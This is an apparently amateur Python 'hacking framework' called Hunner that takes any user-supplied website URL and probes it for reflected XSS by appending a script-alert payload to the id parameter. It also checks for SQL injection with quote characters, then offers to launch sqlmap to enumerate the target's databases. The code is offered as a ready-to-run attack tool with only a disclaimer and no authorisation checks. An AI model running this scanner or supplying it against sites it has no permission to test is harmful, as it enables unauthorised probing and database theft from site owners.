# Create python3 
# Author B3avers
# 
import urllib.request  as urllib2 
import re
import sys,os
import random

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'
 
def info():
	VERSION = B+'1.0'+E
	AUTHOR =  B+'B3-v3r'+E
	print("""
		#################################
		#                               # 
		#          Version-> %s        #
		#                               #
		#          Author->  %s     # 
		#                               #
		#################################
		""" % (VERSION, AUTHOR))
def heads():
	global head
	head = E+H+"""
MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  
	"""+E
def banner():
	text1 = B+"""
 ___                                                             
(   )                                                            
 | | .-.    ___  ___   ___ .-.    ___ .-.     .--.    ___ .-.    
 | |/   \  (   )(   ) (   )   \  (   )   \   /    \  (   )   \   
 |  .-. .   | |  | |   |  .-. .   |  .-. .  |  .-. ;  | ' .-. ;  
 | |  | |   | |  | |   | |  | |   | |  | |  |  | | |  |  / (___) 
 | |  | |   | |  | |   | |  | |   | |  | |  |  ' _.'  | |        
 | |  | |   | |  ; '   | |  | |   | |  | |  |  .'.-.  | |        
 | |  | |   ' `-'  /   | |  | |   | |  | |  '  `-' /  | |   
(___)(___)   '.__.'   (___)(___) (___)(___)  `.__.'  (___)
       """+F+'<<<<--------'+W+'The hacking framework'+F+'-------->>>>'+E
	text2 = O+"""
 _   _                             
| | | |                            
| |_| |_   _ _ __  _ __   ___ _ __ 
|  _  | | | | '_ \| '_ \ / _ \ '__|
| | | | |_| | | | | | | |  __/ |   
\_| |_/\__,_|_| |_|_| |_|\___|_|   
      """+F+'<<<<---------'+W+'B3-v3r'+F+'--------->>>>'+E+F+'\n<<<<--------'+W+'The hacking framework'+F+'-------->>>>'+E
	text3 = F+"""
	 ____  ____                                          
	|_   ||   _|                                         
  	  | |__| |  __   _   _ .--.   _ .--.  .---.  _ .--.  
  	  |  __  | [  | | | [ `.-. | [ `.-. |/ /__\\[ `/'`\] 
	 _| |  | |_ | \_/ |, | | | |  | | | || \__., | |     
	|____||____|'.__.'_/[___||__][___||__]'.__.'[___]    
                                             
	"""+B+'Version ='+W+' 1.0'+E
	ran = random.randrange(1, 4)
	if ran == 1:
		print(text1)
	elif ran == 2:
		print(text2)
	elif ran == 3:
		print(text3)

def XXS():
	os.system('clear')
	banner()
	print('Enter site:')
	try:
		site = input(B+'Hunner»XXS»'+E) 
	except:
		print(F+'\nError'+E)
		
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass

	if "id=" not in site:
		print(F+'[!]'+E+' Site dont have id parametrs')
	else:
		print(W+'[*]'+G+' Site '+site+' have "id" param')
	
	try:
		res = urllib2.urlopen(site)
	except:
		print(F+'[!] Site not work'+E)
		exit()
	
	try:
		print(W+'[+]'+G+' Site work'+E)
		scr = ';<script>alert(111111111111111111111);</script>'
		site_xxs = site+scr
		res = urllib2.urlopen(site_xxs)
		info = res.info()
		print('################Info################\n')
		print(info)
		print('####################################\n')
		text = res.read()

		if "111111111111111111111" not in str(text):
			print(F+'[!]'+' Site not have XXs '+E)
			exit()
		else:
			print(U+W+'[++]'+B+' Site '+site +' have xxs vulnerability'+E)
			print(W+'Payload: '+G+site_xxs+E)
			sys.exit(1)

	except:
		print(F+'[!]'+' Fatal Error'+E)
		exit()
def desc():
	print(G+'''
  THIS TOOL FOR HELP YOU TO FIND YOU WEAKNESS SECURITY WEBSITE 
  I NOT RESPONSIBLE FOR THE ABUSE  OF THIS TOOL 
  @COPYRIGHT BY ~MR A~ <--[MalaY CybeR FamilY]-->
    '''+E)

def SQL():
	os.system('clear')
	banner()
	print(G+'Enter site:'+E)
	site = input(B+'Hunner»SqlScaner»'+E)
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass
	if "id=" not in site:
		print(F+'[!]'+E+' Site dont have id parametrs')
	else:
		print(W+'[*]'+G+' Site '+site+' have "id" param')
	try:
		res = urllib2.urlopen(site)
		print(W+'[+]'+G+' Site work'+E)
	except:
		print(F+'[!]'+E+' Site dont work')
	try:
		info = res.info()
		print('#####################Info#####################')
		print(info)
		print('##############################################')
		bad_site = site+'\'\"'
		res = urllib2.urlopen(bad_site)
		text = res.read()
		if 'You have an error in your SQL syntax' not in str(text):
			print(W+'[--]'+F+' Site '+site+' not have Sql Error'+E)
		else:
			print(W+'[++]'+H+' Site '+F+site+H+' have SQL Error '+E)
			print('Start sqlmap ?')
			y = input('Y/n->')
			if y == "Y" or y == 'y':
				os.system('sqlmap.py -u '+site+' --dbs')
			else:
				print(W+'<< Good by >> '+E)
	except:
		print(F+'Fatal error'+E)
		exit (1);

def Main_Menu():
	print(head)
	desc()
	print('\n')
	print(B+'''
	Menu sites:
  	'''+E+'''
  	1) XXS
  	2) Sql
  	'''+W+'''-------------------\n'''+E)
	try:
		v = input('Hunner-»')
	except:
		print(' Good by ')
		exit()
	
	if v == 'help':
		info()
	elif int(v) == 1:
		XXS()
	elif int(v) == 2:
		SQL()
	else:
		print(F+'[!]'+' You entered an incorrect value '+E)
		exit()
heads()
Main_Menu()
